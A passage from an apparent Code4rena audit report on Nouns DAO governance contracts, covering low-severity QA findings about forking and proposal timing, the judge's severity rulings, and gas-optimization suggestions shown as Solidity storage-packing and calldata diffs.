https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L921-L923

```solidity
    function proposalThreshold() public view returns (uint256) {
        return bps2Uint(proposalThresholdBPS, nouns.totalSupply());
    }
```
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L1066-L1068

```solidity
    function bps2Uint(uint256 bps, uint256 number) internal pure returns (uint256) {
        return (number * bps) / 10000;
    }
```

## [06] V3 upgrade could depreciate token value due to oversupply
The forking feature, though rarely happened as [documented in the FAQs](https://mirror.xyz/0x10072dfc23771101dC042fD0014f263316a6E400/iN0FKOn_oYVBzlJkwPwK2mhzaeL8K2-W80u82F7fHj8), could potentially affect the Nouns token value. This is because:
- a new fork will have its own DAO tokens daily generated and auctioned off through a new Auction House.
- new Nouns tokens claimed through escrow and during forking period will not have the original Nouns tokens burned. They are transferred to the original treasury or elsewhere as the DAO deems fit.

With a new fork competing with the original DAO for the daily auction, it will likely diverge the amount of ETH intended to go into bidding for the daily new NFTs at opposing ends. The situation could be worse in the far future if more forks were to transpire.

## [07] Nouns fork may not efficiently remedy a bad situation
The `20%` threshold, as [documented in the FAQs](https://mirror.xyz/0x10072dfc23771101dC042fD0014f263316a6E400/iN0FKOn_oYVBzlJkwPwK2mhzaeL8K2-W80u82F7fHj8) for instance, `800 * 0.2 = 160` of Nouns tokens, is not a small number comparatively in terms of the market cap. This translates to approximately `160 * 30 ETH * $2,000` almost equivalent to 10 million worth of USDC. For members wishing to dodge bad/undesirable proposals that aren't going to be vetoed, it's likely this will not materialize where the proposals get executed long before the threshold could be met to initiate a fork.

Consider conditionally reducing the threshold given that ragequit (or [quitting](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L196-L245)) is going to happen regardless of the size of the fork. It is the forking group that could share the same goal and direction in a new DAO that matters.        

## [08] Prolonged process due to updatable state
The introduction of [`updatePeriodEndBlock`](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L67) in V3 compared to the V1/V2 could unnecessarily prolong the entire proposal voting process.

Consider reducing the pending period to make room for the updatable period which should nonetheless be entailing a longer period still, albeit in a more reasonable sense.

**[gzeon (judge) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/124#issuecomment-1650660550):**
 > **Reserve price not fully taken care of** -> Low
> 
> **Code and comment mismatch** -> Non-Critical
> 
> **Spelling errors** -> Non-Critical
> 
> **Wrong adoption of block time** -> Non-Critical
> 
> **`MIN_PROPOSAL_THRESHOLD_BPS` is too low a value** -> Low
> 
> **V3 upgrade could depreciate token value due to oversupply** -> Non-Critical
> 
> **Nouns fork may not efficiently remedy a bad situation** -> Non-Critical
> 
> **Prolonged process due to updatable state** -> Non-Critical



***

# Gas Optimizations

For this audit, 15 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/262) by **c3phas** received the top score from the judge.

*The following wardens also submitted reports: [JCN](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/266), [Raihan](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/254), [flutter\_developer](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/253), [petrichor](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/251), [0xAnah](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/250), [naman1778](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/249), [SM3\_SS](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/246), [SAQ](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/233), [Aymen0909](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/224), [MohammedRizwan](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/222), [klau5](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/199), [hunter\_w3b](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/179), [K42](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/120), and [dharma09](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/103).*

## Notes from Warden 

### Warden's Disclaimer

While we try our best to maintain readability in the provided code snippets, some functions have been truncated to highlight the affected portions.

It's important to note that during the implementation of these suggested changes, developers must exercise caution to avoid introducing vulnerabilities. Although the optimizations have been tested prior to these recommendations, it is the responsibility of the developers to conduct thorough testing again.

Code reviews and additional testing are strongly advised to minimize any potential risks associated with the refactoring process.

### Note on Gas estimates
I've tried to give the exact amount of gas being saved from running the included tests. Whenever the function is within the test coverage, the average gas before and after will be included, and often a diff of the code will also accompany this.

Some functions are not covered by the test cases or are internal/private functions. In this case, the gas can be estimated by looking at the opcodes involved. For some benchmarks are based on the function that calls this internal functions.

## [G-01] Tightly pack storage variables/optimize the order of variable declaration
The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to eachother in storage and this will pack the values together into a single 32 byte storage slot (if the values combined are <= 32 bytes). If the variables packed together are retrieved together in functions we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a `Gwarmaccess (100 gas)` versus a `Gcoldsload (2100 gas)`.
Here, the storage variables can be tightly packed from:

<details>

### We can pack `admin and delay` by reducing the size of delay to uint8, or any other type less than uint96 (Save 1 SLOT: 2100 GAS)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol#L89-L91

**This is possible because we constrain the value of `delay` to 0 - 30** 
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol
89:    address public admin;
90:    address public pendingAdmin;
91:    uint256 public delay;
```

We can see why it's safe to reduce the size of the variable delay. When setting delay we are checking that the value set should be between **MINIMUM\_DELAY and MAXIMUM\_DELAY** which are constant variables with values 0 and 30 respectively.<br>
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol#L103-L110

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol
103:    function setDelay(uint256 delay_) public {

105:        require(delay_ >= MINIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must exceed minimum delay.');
106:        require(delay_ <= MAXIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must not exceed maximum delay.');
107:        delay = delay_;
```

**The refactored code would be like this, note that we pack with admin as they are accessed in one transaction**
```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol
index f4f85883..ab900fed 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutorV2.sol
@@ -87,8 +87,9 @@ contract NounsDAOExecutorV2 is UUPSUpgradeable, Initializable {
     uint256 public constant MAXIMUM_DELAY = 30 days;

     address public admin;
+    uint8 public delay;
     address public pendingAdmin;
-    uint256 public delay;
```
Some other parts of the code will pass a uint256 thus we can type cast those parts eg 
```diff
     function setDelay(uint256 delay_) public {
         require(msg.sender == address(this), 'NounsDAOExecutor::setDelay: Call must come from NounsDAOExecutor.');
         require(delay_ >= MINIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must exceed minimum delay.');
         require(delay_ <= MAXIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must not exceed maximum delay.');
-        delay = delay_;
+        delay = uint8(delay_);

         emit NewDelay(delay_);
     }
```

### Pack admin and delay together by reducing size of delay (Save 1 SLOT: 2.1K Gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol#L66-L68

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
66:    address public admin;
67:    address public pendingAdmin;
68:    uint256 public delay;
```
When setting delay, we have a conditional check that ensures the value of delay is between  2 and 30
```solidity
        require(delay_ >= MINIMUM_DELAY, 'NounsDAOExecutor::constructor: Delay must exceed minimum delay.');
        require(delay_ <= MAXIMUM_DELAY, 'NounsDAOExecutor::setDelay: Delay must not exceed maximum delay.');
```
As such we know delay will always be less than 30. We can therefore reduce the size of the data type to uint8 and pack the variable with `admin`

```diff
--- a/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOExecutor.sol
@@ -64,9 +64,9 @@ contract NounsDAOExecutor {
     uint256 public constant MAXIMUM_DELAY = 30 days;

     address public admin;
+    uint8 public delay;
     address public pendingAdmin;
-    uint256 public delay;
```

### Both duration and timeBuffer can be changed to uint48 (Save 3 SLOTS: 6300 Gas )
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol#L50-L69

**We pack nouns with duration, weth with timeBuffer and minBidIncrementPercentage**
```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol

50:    // The Nouns ERC721 token contract
51:    INounsToken public nouns;

53:    // The address of the WETH contract
54:    address public weth;

56:    // The minimum amount of time left in an auction after a new bid is created
57:    uint256 public timeBuffer;

59:    // The minimum price accepted in an auction
60:    uint256 public reservePrice;

62:    // The minimum percentage difference between the last bid amount and the current bid
63:    uint8 public minBidIncrementPercentage;

65:    // The duration of a single auction
66:    uint256 public duration;

68:    // The active auction
69:    INounsAuctionHouse.Auction public auction;
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol
index 0bd594b6..2746e3d6 100644
--- a/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol
+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/NounsAuctionHouseFork.sol
@@ -49,21 +49,21 @@ contract NounsAuctionHouseFork is

     // The Nouns ERC721 token contract
     INounsToken public nouns;
+    // The duration of a single auction
+    uint48 public duration;

     // The address of the WETH contract
     address public weth;

     // The minimum amount of time left in an auction after a new bid is created
-    uint256 public timeBuffer;
-
-    // The minimum price accepted in an auction
-    uint256 public reservePrice;
+    uint48 public timeBuffer;

     // The minimum percentage difference between the last bid amount and the current bid
     uint8 public minBidIncrementPercentage;

-    // The duration of a single auction
-    uint256 public duration;
+    // The minimum price accepted in an auction
+    uint256 public reservePrice;
+

     // The active auction
     INounsAuctionHouse.Auction public auction;
```

### Pack minter with isMinterLocked, descriptor with isDescriptorLocked, seeder with isSeederLocked, escrow with both forkId and forkingPeriodEndTimestamp : From 10 slots to 8 slots (Save 2 SLOTS)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol#L48-L85

**1 SLOT = 2k Gas**<br>
 **Total gas saved: 4K gas**

*For forkingPeriodEndTimestamp we can reduce the size to uint48 as it should be safe for timestamp*
```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol

49:    address public minter;

52:    INounsDescriptorMinimal public descriptor;

55:    INounsSeeder public seeder;

58:    INounsDAOForkEscrow public escrow;

61:    uint32 public forkId;

64:    uint256 public remainingTokensToClaim;

67:    uint256 public forkingPeriodEndTimestamp;

70:    bool public isMinterLocked;

73:    bool public isDescriptorLocked;

76:    bool public isSeederLocked;

79:    mapping(uint256 => INounsSeeder.Seed) public seeds;

82:    uint256 private _currentNounId;

85:    string private _contractURIHash = 'QmZi1n79FqWt2tTLwCqiy6nLM6xLGRsEPQ5JmReJQKNNzX';
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol
index a1f9d6d3..ba8947db 100644
--- a/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol
+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol
@@ -48,11 +48,20 @@ contract NounsTokenFork is INounsTokenFork, OwnableUpgradeable, ERC721Checkpoint
     /// @notice  An address who has permissions to mint Nouns
     address public minter;

+    /// @notice Whether the minter can be updated
+    bool public isMinterLocked;
+
     /// @notice The Nouns token URI descriptor
     INounsDescriptorMinimal public descriptor;

+    /// @notice Whether the descriptor can be updated
+    bool public isDescriptorLocked;
+
     /// @notice The Nouns token seeder
     INounsSeeder public seeder;
+
+    /// @notice Whether the seeder can be updated
+    bool public isSeederLocked;

     /// @notice The escrow contract used to verify ownership of the original Nouns in the post-fork claiming process
     INounsDAOForkEscrow public escrow;
@@ -60,20 +69,11 @@ contract NounsTokenFork is INounsTokenFork, OwnableUpgradeable, ERC721Checkpoint
     /// @notice The fork ID, used when querying the escrow for token ownership
     uint32 public forkId;

-    /// @notice How many tokens are still available to be claimed by Nouners who put their original Nouns in escrow
-    uint256 public remainingTokensToClaim;
-
     /// @notice The forking period expiration timestamp, after which new tokens cannot be claimed by the original DAO
-    uint256 public forkingPeriodEndTimestamp;
+    uint48 public forkingPeriodEndTimestamp;

-    /// @notice Whether the minter can be updated
-    bool public isMinterLocked;
-
-    /// @notice Whether the descriptor can be updated
-    bool public isDescriptorLocked;
-
-    /// @notice Whether the seeder can be updated
-    bool public isSeederLocked;
+    /// @notice How many tokens are still available to be claimed by Nouners who put their original Nouns in escrow
+    uint256 public remainingTokensToClaim;

     /// @notice The noun seeds
     mapping(uint256 => INounsSeeder.Seed) public seeds;
```

### Due to how variables are constrained during allocation, their sizes can be reduced to uint48 (Save 4 Slots ) From 10 slots to 6 slots
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol#L380-L403

Gas saved: `4 SLots * 2.1K gas` = 8.4K gas
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol
contract NounsDAOStorageV1Adjusted is NounsDAOProxyStorage {
382:    address public vetoer;

385:    uint256 public votingDelay;

388:    uint256 public votingPeriod;

391:    uint256 public proposalThresholdBPS;

394:    uint256 public quorumVotesBPS;

397:    uint256 public proposalCount;

400:    INounsDAOExecutor public timelock;

403:    NounsTokenLike public nouns;
```

**Whenever votingDelay, votingPeriod, proposalThresholdBPS are being assigned a value, we ensure the value has a limit** See below
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L150-L161
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
150:        require(
151:            votingPeriod_ >= MIN_VOTING_PERIOD && votingPeriod_ <= MAX_VOTING_PERIOD,
152:            'NounsDAO::initialize: invalid voting period'
153:        );
154:        require(
155:            votingDelay_ >= MIN_VOTING_DELAY && votingDelay_ <= MAX_VOTING_DELAY,
156:            'NounsDAO::initialize: invalid voting delay'
157:        );
158:        require(
159:            proposalThresholdBPS_ >= MIN_PROPOSAL_THRESHOLD_BPS && proposalThresholdBPS_ <= MAX_PROPOSAL_THRESHOLD_BPS,
160:            'NounsDAO::initialize: invalid proposal threshold bps'
161:        );
```
The above checks are always made whenever we need to set a value to our storage values. As the checks ensure our values don't exceed a certain number(constant numbers defined) we can inspect the value of the constants and make sure our chosen data type would fit the number.

For all constants defined in our contracts, for the selected variables here, uint48 would fit without loosing any precision.

We can therefore pack as follows
```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol b/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol
index 8fb0b4d3..3fed7bc2 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol
@@ -382,17 +382,11 @@ contract NounsDAOStorageV1Adjusted is NounsDAOProxyStorage {
     address public vetoer;

     /// @notice The delay before voting on a proposal may take place, once proposed, in blocks
-    uint256 public votingDelay;
+    uint48 public votingDelay;

     /// @notice The duration of voting on a proposal, in blocks
-    uint256 public votingPeriod;
-
-    /// @notice The basis point number of votes required in order for a voter to become a proposer. *DIFFERS from GovernerBravo
-    uint256 public proposalThresholdBPS;
-
-    /// @notice The basis point number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed. *DIFFERS from GovernerBravo
-    uint256 public quorumVotesBPS;
-
+    uint48 public votingPeriod;
+
     /// @notice The total number of proposals
     uint256 public proposalCount;

@@ -401,6 +395,10 @@ contract NounsDAOStorageV1Adjusted is NounsDAOProxyStorage {

     /// @notice The address of the Nouns tokens
     NounsTokenLike public nouns;
+        /// @notice The basis point number of votes required in order for a voter to become a proposer. *DIFFERS from GovernerBravo
+    uint48 public proposalThresholdBPS;
+    /// @notice The basis point number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed. *DIFFERS from GovernerBravo
+    uint48 public quorumVotesBPS;

     /// @notice The official record of all proposals ever proposed
     mapping(uint256 => Proposal) internal _proposals;
```

</details>

## [G-02] Pack structs by putting data types that can fit together next to each other
As the solidity EVM works with 32 bytes, variables less than 32 bytes should be packed inside a struct so that they can be stored in the same slot, this saves gas when writing to storage ~20000 gas

### We have some uint32 that can be be packed with an address (Save 1 SLOT: 2.1K gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol#L653-L717

**Pack lastMinuteWindowInBlocks,objectionPeriodDurationInBlocks,proposalUpdatablePeriodInBlocks with forkDAOTreasury** 
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol
    struct StorageV3 {
		<Truncated>
690:        uint32 lastMinuteWindowInBlocks;
691:        /// @notice Length of the objection period in blocks
692:        uint32 objectionPeriodDurationInBlocks;
693:        /// @notice Length of proposal updatable period in block
694:        uint32 proposalUpdatablePeriodInBlocks;
695:        /// @notice address of the DAO's fork escrow contract
696:        INounsDAOForkEscrow forkEscrow;
697:        /// @notice address of the DAO's fork deployer contract
698:        IForkDAODeployer forkDAODeployer;
699:        /// @notice ERC20 tokens to include when sending funds to a deployed fork
700:        address[] erc20TokensToIncludeInFork;
701:        /// @notice The treasury contract of the last deployed fork
702:        address forkDAOTreasury;
    <Truncated>
       
    }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol b/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol
index 8fb0b4d3..ba0a251f 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOInterfaces.sol
@@ -686,12 +686,6 @@ contract NounsDAOStorageV3 {
         // ================ V3 ================ //
         /// @notice user => sig => isCancelled: signatures that have been cancelled by the signer and are no longer valid
         mapping(address => mapping(bytes32 => bool)) cancelledSigs;
-        /// @notice The number of blocks before voting ends during which the objection period can be initiated
-        uint32 lastMinuteWindowInBlocks;
-        /// @notice Length of the objection period in blocks
-        uint32 objectionPeriodDurationInBlocks;
-        /// @notice Length of proposal updatable period in block
-        uint32 proposalUpdatablePeriodInBlocks;
         /// @notice address of the DAO's fork escrow contract
         INounsDAOForkEscrow forkEscrow;
         /// @notice address of the DAO's fork deployer contract
@@ -700,6 +694,12 @@ contract NounsDAOStorageV3 {
         address[] erc20TokensToIncludeInFork;
         /// @notice The treasury contract of the last deployed fork
         address forkDAOTreasury;
+        /// @notice The number of blocks before voting ends during which the objection period can be initiated
+        uint32 lastMinuteWindowInBlocks;
+        /// @notice Length of the objection period in blocks
+        uint32 objectionPeriodDurationInBlocks;
+        /// @notice Length of proposal updatable period in block
+        uint32 proposalUpdatablePeriodInBlocks;
         /// @notice The token contract of the last deployed fork
         address forkDAOToken;
```

## [G-03] Use calldata instead of memory for function parameters
If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.

Note that I've also flagged instances where the function is public but can be marked as external since it's not called by the contract.

<details>

### NounsDAOLogicV3.sol.updateProposal(): use calldata for `targets,values,signatures,calldatas,description` (Saves 2251 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L278-L288

**Gas benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 10622    | 20773   | 14500 | 92416 |
| After  | 9612    | 18522   | 12580 | 90342 |
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
278:    function updateProposal(
279:        uint256 proposalId,
280:        address[] memory targets,
281:        uint256[] memory values,
282:        string[] memory signatures,
283:        bytes[] memory calldatas,
284:        string memory description,
285:        string memory updateMessage
286:    ) external {
287:        ds.updateProposal(proposalId, targets, values, signatures, calldatas, description, updateMessage);
288:    }
```
Last variable has not been modified to avoid the stack too deep error
```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
index 00c5ccdc..4e8281cb 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
@@ -277,11 +277,11 @@ contract NounsDAOLogicV3 is NounsDAOStorageV3, NounsDAOEventsV3 {
      */
     function updateProposal(
         uint256 proposalId,
-        address[] memory targets,
-        uint256[] memory values,
-        string[] memory signatures,
-        bytes[] memory calldatas,
-        string memory description,
+        address[] calldata targets,
+        uint256[] calldata values,
+        string[] calldata signatures,
+        bytes[] calldata calldatas,
+        string calldata description,
         string memory updateMessage
     ) external {
         ds.updateProposal(proposalId, targets, values, signatures, calldatas, description, updateMessage);
```

### NounsDAOLogicV3.sol.updateProposalTransactions(): use calldata for `targets,values,signatures,calldatas,updateMessage` (Saves 2301 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L313-L322

**Gas benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 9566    | 19643   | 13349 | 90201 |
| After  | 8515    | 17342   | 11461 | 88076 |
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
313:    function updateProposalTransactions(
314:        uint256 proposalId,
315:        address[] memory targets,
316:        uint256[] memory values,
317:        string[] memory signatures,
318:        bytes[] memory calldatas,
319:        string memory updateMessage
320:    ) external {
321:        ds.updateProposalTransactions(proposalId, targets, values, signatures, calldatas, updateMessage);
322:    }
```

```diff
     function updateProposalTransactions(
         uint256 proposalId,
-        address[] memory targets,
-        uint256[] memory values,
-        string[] memory signatures,
-        bytes[] memory calldatas,
-        string memory updateMessage
+        address[] calldata targets,
+        uint256[] calldata values,
+        string[] calldata signatures,
+        bytes[] calldata calldatas,
+        string calldata updateMessage
     ) external {
         ds.updateProposalTransactions(proposalId, targets, values, signatures, calldatas, updateMessage);
     }
```

### NounsDAOLogicV3.sol.updateProposalBySigs(): use calldata for `proposerSignatures,targets,values` (Saves 2197 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L338-L355

**Gas benchmarks**

|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 15239  | 38005   | 33310  | 122687 |
| After  | 14700 | 35808   | 31945  | 120500 |
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
338:    function updateProposalBySigs(
339:        uint256 proposalId,
340:        ProposerSignature[] memory proposerSignatures,
341:        address[] memory targets,
342:        uint256[] memory values,
343:        string[] memory signatures,
344:        bytes[] memory calldatas,
345:        string memory description,
346:        string memory updateMessage
347:    ) external {
348:        ds.updateProposalBySigs(
349:            proposalId,
350:            proposerSignatures,
351:            NounsDAOV3Proposals.ProposalTxs(targets, values, signatures, calldatas),
352:            description,
353:            updateMessage
354:        );
355:    }
```
We cannot refactor all variables to avoid stack too deep error
```diff
     function updateProposalBySigs(
         uint256 proposalId,
-        ProposerSignature[] memory proposerSignatures,
-        address[] memory targets,
-        uint256[] memory values,
+        ProposerSignature[] calldata proposerSignatures,
+        address[] calldata targets,
+        uint256[] calldata values,
         string[] memory signatures,
         bytes[] memory calldatas,
         string memory description,
```

### NounsDAOLogicV3.sol.proposeBySigs(): use calldata for `proposerSignatures,targets,values,signatures` (Saves 1565 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L236-L250

**Gas benchmarks**

|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 13725  | 431650   | 431722  | 535759 |
| After  | 13336 | 430085   | 430511  | 533718 |
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
236:    function proposeBySigs(
237:        ProposerSignature[] memory proposerSignatures,
238:        address[] memory targets,
239:        uint256[] memory values,
240:        string[] memory signatures,
241:        bytes[] memory calldatas,
242:        string memory description
243:    ) external returns (uint256) {
244:        return
245:            ds.proposeBySigs(
246:                proposerSignatures,
247:                NounsDAOV3Proposals.ProposalTxs(targets, values, signatures, calldatas),
248:                description
249:            );
250:    }
```
Note: not all variables are changed, this is to avoid the stack too deep error

```diff
     function proposeBySigs(
-        ProposerSignature[] memory proposerSignatures,
-        address[] memory targets,
-        uint256[] memory values,
-        string[] memory signatures,
+        ProposerSignature[] calldata proposerSignatures,
+        address[] calldata targets,
+        uint256[] calldata values,
+        string[] calldata signatures,
         bytes[] memory calldatas,
         string memory description
     ) external returns (uint256) {
```

### NounsDAOLogicV3.sol.proposeOnTimelockV1():  Change to external and use calldata for `targets,values,signatures,calldatas,description` (Saves 541 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol#L210-L222

**Gas benchmarks**

|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 341736  | 683821   | 683821  | 1025906 |
| After  | 341705 | 683280   | 683280  | 1024855 |
```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV3.sol
210:    function proposeOnTimelockV1(
211:        address[] memory targets,
212:        uint256[] memory values,
213:        string[] memory signatures,
214:        bytes[] memory calldatas,
215:        string memory description
216:    ) public returns (uint256) {
217:        return
218:            ds.proposeOnTimelockV1(
219:                NounsDAOV3Proposals.ProposalTxs(targets, values, signatures, calldatas),
220:                description
221:            );
222:    }
```

```diff
     function proposeOnTimelockV1(
-        address[] memory targets,
-        uint256[] memory values,
-        string[] memory signatures,
-        bytes[] memory calldatas,
-        string memory description
-    ) public returns (uint256) {
+        address[] calldata targets,
+        uint256[] calldata values,
+        string[] calldata signatures,
+        bytes[] calldata calldatas,
+        string calldata description
+    ) external returns (uint256) {
         return
             ds.proposeOnTimelockV1(
                 NounsDAOV3Proposals.ProposalTxs(targets, values, signatures, calldatas),
```

### NounsDAOLogicV1Fork.sol.quit(): use calldata for `erc20TokensToInclude` (Saves 105 gas on average)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216

**Gas benchmarks**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 14309    | 165989   | 151098 | 347452 |
| After  | 165884    | 165884   | 151011 | 347390 |

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
206:    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {

208:        address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;
209:        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
210:            if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {
211:                revert TokensMustBeASubsetOfWhitelistedTokens();
212:            }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
index 0b098e44..beaff3ab 100644
--- a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
@@ -203,7 +203,7 @@ contract NounsDAOLogicV1Fork is UUPSUpgradeable, ReentrancyGuardUpgradeable, Nou
         quitInternal(tokenIds, erc20TokensToIncludeInQuit);
     }

-    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {
+    function quit(uint256[] calldata tokenIds, address[] calldata erc20TokensToInclude) external nonReentrant {
         // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`
         address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;
         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {
```

